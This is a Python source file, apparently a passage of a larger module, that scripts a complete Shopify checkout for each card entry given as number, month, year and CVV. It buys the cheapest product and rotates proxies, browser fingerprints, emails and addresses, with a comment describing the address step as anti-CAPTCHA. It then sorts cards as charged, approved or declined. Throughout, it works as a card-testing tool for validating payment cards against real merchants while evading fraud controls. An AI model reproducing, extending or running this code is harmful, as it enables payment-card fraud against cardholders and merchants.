        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
    }

    with Session(impersonate=impersonate) as session:
        post_kwargs = {"data": payload, "headers": headers, "timeout": 20}
        if proxy_url:
            post_kwargs["proxy"] = proxy_url
        resp = session.post(endpoint, **post_kwargs)
    return resp.status_code, resp.text


# ──────────────────────── Proposal helpers ───────────────────────────

def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, build_id: str, source_token: str) -> Dict:
    return {
        "accept": "application/json",
        "accept-language": "en-US",
        "content-type": "application/json",
        "origin": shop_url,
        "priority": "u=1, i",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="124", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_token,
    }


def _build_proposal_payload(stable_id, variant_id, session_token, proposal_id,
                             queue_token, email, addr, with_address=True):
    if with_address and addr:
        address_block = f'''{{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }}'''
        billing_block = f'''{{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}'''
    else:
        address_block = '{"partialStreetAddress": {"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": "", "oneTimeUse": false}}'
        billing_block = '{"streetAddress": {"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}'

    email_block = ""
    if email:
        email_block = f'"email": "{email}", "emailChanged": {"true" if with_address else "false"},'

    payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": {f'"{queue_token}"' if queue_token else 'null'},
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {address_block},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {billing_block}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      {email_block}
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    return payload


def send_proposal(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                  session_token: str, stable_id: str, variant_id: str, price: str,
                  proposal_id: str, build_id: str, source_token: str,
                  currency: str, country: str,
                  queue_token: str = None, email: str = None, addr: Address = None,
                  with_address: bool = False) -> Tuple[int, str]:
    gql_payload = _build_proposal_payload(stable_id, variant_id, session_token, proposal_id,
                                          queue_token, email, addr, with_address)
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 10: SubmitForCompletion ───────────────

def send_poll_for_receipt(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, build_id: str, source_token: str,
                          poll_id: str, receipt_id: str, receipt_session_token: str) -> Tuple[int, str]:
    params = {
        "operationName": "PollForReceipt",
        "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id": poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    headers = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token
    resp = client.get(full_url, headers=headers)
    return resp.status_code, resp.text


def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                               session_token: str, stable_id: str, variant_id: str, price: str,
                               submit_id: str, build_id: str, source_token: str, queue_token: str,
                               email: str, addr: Address, delivery_handle: str, shipping_amount: str,
                               total_amount: str, pci_session_id: str, attempt_token: str,
                               currency: str, country: str, signed_handles: List[str],
                               is_digital: bool = False,
                               tax_amount: str = None) -> Tuple[int, str]:
    handle_lines = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id = generate_page_id()

    if is_digital:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Error checking ─────────────────────────────

def check_proposal_errors(step: str, status: int, body: str):
    if status != 200:
        logger.warning("%s: unexpected HTTP %d", step, status)
    matches = re.findall(
        r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
        body,
    )
    if not matches:
        return
    for code, msg in matches:
        logger.warning("%s proposal error — code=%s msg=%s", step, code, msg)
    _hard_stop = {"CARD_DECLINED", "EXPIRED_CARD", "CARD_INVALID", "INVALID_CVC",
                  "CARD_STOLEN", "DO_NOT_HONOR", "RISK_REJECTED"}
    for code, _ in matches:
        if code.upper() in _hard_stop:
            raise Exception(f"proposal hard error: {code}")


def check_submit_errors(status: int, body: str):
    if status != 200:
        logger.warning("check_submit_errors: HTTP %d", status)
    match = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
    if match:
        typename = match.group(1)
        if typename != "SubmitSuccess":
            for i, (code, msg) in enumerate(re.findall(
                r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
                body)):
                logger.warning("submit error #%d: code=%s msg=%s", i + 1, code, msg)


# ──────────────────────── Public API ─────────────────────────────────

def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    card_parts = card_entry.strip().split('|')
    if len(card_parts) != 4:
        raise Exception(f"CARD_INVALID: {card_entry}")
    try:
        card_month = int(card_parts[1])
        card_year = int(card_parts[2])
    except ValueError as e:
        raise Exception(f"CARD_INVALID: {e}")
    return card_parts[0], card_month, card_year, card_parts[3]


def normalize_proxy(raw: str) -> str:
    p = raw.strip()
    if not p:
        raise Exception("empty proxy")
    if '://' not in p:
        parts = p.split(':')
        if len(parts) == 4:
            p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            p = "http://" + p
    parsed = urllib.parse.urlparse(p)
    if not parsed.netloc:
        raise Exception(f"invalid proxy format: {raw}")
    return p


def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "", low: bool = True) -> CheckResult:
    """Run a full Shopify checkout for a single card."""
    currency = "USD"
    country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")

    result = CheckResult(
        card=card_entry,
        shop_url=shop_url,
        site_name=site_name,
        currency=currency,
        status=CheckStatus.ERROR,
    )

    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        result.status_code = "INVALID_CARD"
        return result

    # Random identity per attempt
    email = generate_random_email()
    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = random.choice(USER_AGENTS)

    client = TLSClient(timeout=20, proxy_url=proxy_url,
                       impersonate=impersonate, user_agent=user_agent)

    try:
        # ── Step 0: cheapest product ──
        try:
            _max_p = MAX_PRICE_DEFAULT if low else float("inf")
            title, product_id, variant_id, price = find_cheapest_product(client, shop_url, max_price=_max_p)
            logger.info("Step 0 OK: %r variant=%s price=%s", title, variant_id, price)
            _ = title, product_id
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            err_str = str(e)
            if "NO_PRODUCT" in err_str:
                result.status_code = "NO_PRODUCT"
            elif "PRICE_OVER_MAX" in err_str:
                result.status_code = err_str
            else:
                result.status_code = "CART_FAILED"
            result.retryable = True
            return result

        # ── Step 1: cart → checkout ──
        try:
            checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout(
                client, shop_url, variant_id)
            stable_id = extract_stable_id(checkout_html)
            build_id = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            result.status_code = "CART_FAILED"
            result.retryable = True
            return result

        # ── Step 2: private access token ──
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("no_session_token")
            fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            result.status_code = "NO_SESSION_TOKEN"
            result.retryable = True
            return result

        # ── Step 3: actions JS ──
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("no actions JS")
            js_body = fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            _poll = extract_poll_for_receipt_id(js_body)
            poll_for_receipt_id = _poll or "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            result.status_code = "NO_SESSION_TOKEN"
            result.retryable = True
            return result

        # ── Step 4: Proposal 1 ──
        try:
            _p4_status, proposal_body = send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                currency, country)
            check_proposal_errors("step4", _p4_status, proposal_body)

            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency

            if currency == "USD":
                seller_price = extract_seller_merchandise_price(proposal_body)
                if seller_price and seller_price != price:
                    price = seller_price

            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("no queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            result.status_code = "CART_FAILED"
            result.retryable = True
            return result

        # ── Step 5: Proposal 2 (email) ──
        try:
            _p5_status, proposal2_body = send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                currency, country,
                queue_token=queue_token, email=email, addr=None, with_address=False)
            check_proposal_errors("step5", _p5_status, proposal2_body)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("no queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            result.status_code = "CART_FAILED"
            result.retryable = True
            return result

        # ── Step 6: Proposal 3 (address) — use RANDOM address ──
        try:
            # ⭐ Anti-CAPTCHA: use random address from all 28 countries
            addr = random_address()
            fallback_addrs = get_fallback_addresses(addr.country_code)
            fallback_idx = 0
            qt2 = queue_token2
            final_p3_body = None
            final_qt3 = None
            step6_is_digital = False
            for _attempt in range(1 + len(fallback_addrs)):
                _, proposal3_body = send_proposal(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    currency, country,
                    queue_token=qt2, email=email, addr=addr, with_address=True)
                _qt3 = extract_queue_token(proposal3_body)
                if not _qt3:
                    raise Exception("no queueToken")
                _is_dig = not extract_is_shipping_required(proposal3_body)
                if _is_dig or not detect_shipping_restriction(proposal3_body):
                    final_p3_body = proposal3_body
                    final_qt3 = _qt3
                    step6_is_digital = _is_dig
                    break
                if fallback_idx < len(fallback_addrs):
                    addr = fallback_addrs[fallback_idx]
                    fallback_idx += 1
                    qt2 = _qt3
            if not final_p3_body:
                raise Exception("no shipping available for any country")
            proposal3_body = final_p3_body
            queue_token3 = final_qt3
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            result.status_code = "CART_FAILED"
            result.retryable = True
            return result

        # ── Step 7: Proposal 4 ──
        time.sleep(0.05)
        try:
            _, proposal4_body = send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                currency, country,
                queue_token=queue_token3, email=email, addr=addr, with_address=True)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("no queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            result.status_code = "CART_FAILED"
            result.retryable = True
            return result

        # ── Step 8: Proposal 5 + PendingTerms ──
        time.sleep(0.05)
        try:
            proposal5_status, proposal5_body = send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                currency, country,
                queue_token=queue_token4, email=email, addr=addr, with_address=True)
            _ = proposal5_status
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            result.status_code = "CART_FAILED"
            result.retryable = True
            return result

        try:
            _poll_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
            _pending_re = re.compile(r'"__typename"\s*:\s*"PendingTerms"')
            for _pi in range(6):
                if not _pending_re.search(proposal5_body):
                    break
                _m = _poll_re.search(proposal5_body)
                _wait = int(_m.group(1)) / 1000.0 if _m else 0.5
                time.sleep(max(_wait, 0.3))
                proposal5_status, proposal5_body = send_proposal(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    currency, country,
                    queue_token=queue_token4, email=email, addr=addr, with_address=True)
        except Exception:
            pass

        # ── Step 9: PCI tokenization ──
        try:
            ident_sig = extract_identification_signature(checkout_html)
            vault_url = extract_vault_url(checkout_html)
            vault_domain = extract_vault_domain(checkout_html) or site_name
            if not ident_sig:
                raise Exception("no identification signature")
            card_name_str = f"{addr.first_name} {addr.last_name}"
            _, pci_body = send_pci_session(
                ident_sig, card_number, card_name_str,
                card_month, card_year, card_cvv,
                vault_domain, proxy_url,
                vault_url=vault_url, vault_domain=vault_domain,
                impersonate=impersonate)
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                _fallback = ("https://checkout.pci.shopifycs.com/sessions"
                             if "shopifyinc" in (vault_url or "")
                             else "https://checkout.pci.shopifyinc.com/sessions")
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str,
                    card_month, card_year, card_cvv,
                    site_name, proxy_url, vault_url=_fallback,
                    impersonate=impersonate)
                pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id and proxy_url:
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str,
                    card_month, card_year, card_cvv,
                    vault_domain, "",
                    vault_url=vault_url, vault_domain=vault_domain,
                    impersonate=impersonate)
                pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                raise Exception(f"TOKENIZATION_FAILED: {pci_body[:120]}")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            result.status_code = "TOKENIZATION_FAILED"
            result.retryable = True
            return result

        # ── Step 10: SubmitForCompletion ──
        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("no queueToken")

            is_digital = step6_is_digital
            delivery_handle = extract_delivery_handle(proposal5_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("no delivery handle")

            signed_handles = extract_signed_handles(proposal5_body)
            _filled_dlv5 = ('"__typename": "FilledDeliveryTerms"' in proposal5_body or
                            '"__typename":"FilledDeliveryTerms"' in proposal5_body)
            if len(signed_handles) == 0 and not is_digital and not _filled_dlv5:
                result.retryable = True
                raise Exception("no signedHandles")

            shipping_amount = extract_shipping_amount(proposal5_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("no shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("no total amount")
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)
            current_tax = extract_tax_amount(proposal5_body)
            current_total = total_amount

            MAX_TAX_RETRIES = 3
            submit_status = 0
            submit_body = ""
            for tax_attempt in range(1, MAX_TAX_RETRIES + 1):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token, queue_token5, email,
                    addr, delivery_handle, shipping_amount, current_total,
                    pci_session_id, attempt_token, currency, country, signed_handles,
                    is_digital=is_digital,
                    tax_amount=current_tax)
                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    time.sleep(0.05)
                    continue
                break
            _ = submit_status
            check_submit_errors(submit_status, submit_body)

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    result.status = CheckStatus.DECLINED
                    result.status_code = "CAPTCHA_REQUIRED"
                    result.retryable = False
                    result.error = Exception("CAPTCHA_REQUIRED")
                    return result
                if error_msg:
                    result.status = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error = Exception(error_msg)
                    result.retryable = any(k in error_msg.lower() for k in ['inventory', 'retry', 'try again', 'generic', 'throttle'])
                else:
                    result.status = CheckStatus.ERROR
                    result.status_code = "SUBMIT_FAILED"
                    result.error = Exception("SUBMIT_FAILED")
                    result.retryable = True
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("NO_SESSION_TOKEN")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            if not result.status_code:
                result.status_code = "SUBMIT_FAILED"
            result.retryable = True
            return result

        # ── Step 11: Poll for receipt ──
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')

        for poll_num in range(1, 21):
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token)

                receipt_type = ""
                match = type_name_re.search(poll_body)
                if match:
                    receipt_type = match.group(1)

                status_code = extract_receipt_status_code(poll_body, receipt_type)
                result.status_code = status_code

                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                    result.status = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"
                    try:
                        poll_json = json.loads(poll_body)
                        receipt_obj = poll_json.get("data", {}).get("receipt", {})
                        conf_url = receipt_obj.get("confirmationPage", {}).get("url", "")
                        result.receipt_url = conf_url or checkout_url
                    except Exception:
                        result.receipt_url = checkout_url
                    return result

                if receipt_type == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_REQUIRED"
                    return result

                if receipt_type == "FailedReceipt":
                    error_code = ""
                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    match = error_re.search(poll_body)
                    if match:
                        error_code = match.group(1)

                    if "CAPTCHA" in error_code:
                        result.status = CheckStatus.ERROR
                        result.status_code = "CAPTCHA_REQUIRED"
                        result.retryable = True
                        result.error = Exception("CAPTCHA_REQUIRED")
                        return result
                    elif error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                        return result
                    elif error_code == "CARD_DECLINED":
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception("CARD_DECLINED")
                        return result
                    elif error_code in ("EXPIRED_CARD",):
                        result.status = CheckStatus.DECLINED
                        result.status_code = "EXPIRED_CARD"
                        result.error = Exception("EXPIRED_CARD")
                        return result
                    elif error_code in ("INVALID_CVC",):
                        result.status = CheckStatus.DECLINED
                        result.status_code = "INVALID_CVC"
                        result.error = Exception("INVALID_CVC")
                        return result
                    elif error_code == "GENERIC_ERROR":
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception("CARD_DECLINED")
                        return result
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status = CheckStatus.ERROR
                            result.status_code = "CART_FAILED"
                            result.retryable = True
                            return result
                        _site_signals = ["fraud", "not supported", "brand", "suspected", "risk", "shipping", "artifact", "transformer", "not available", "cannot be placed"]
                        if any(s in (error_code + " " + poll_body).lower() for s in _site_signals):
                            result.status = CheckStatus.ERROR
                            result.status_code = "CART_FAILED"
                            result.retryable = True
                            result.error = Exception(error_code)
                            return result
                        result.status = CheckStatus.DECLINED
                        result.status_code = error_code or "CARD_DECLINED"
                        result.error = Exception(error_code or "CARD_DECLINED")
                        return result

                delay = 500
                match = poll_delay_re.search(poll_body)
                if match:
                    try:
                        d = int(match.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                time.sleep(min(delay, 3000) / 1000.0)

            except Exception as e:
                result.status = CheckStatus.ERROR
                result.status_code = "TIMEOUT"
                result.error = Exception(f"poll {poll_num} failed: {e}")
                return result

        result.status = CheckStatus.ERROR
        result.status_code = "TIMEOUT"
        result.retryable = True
        result.error = Exception("exceeded 20 poll attempts")
        return result

    finally:
        client.close()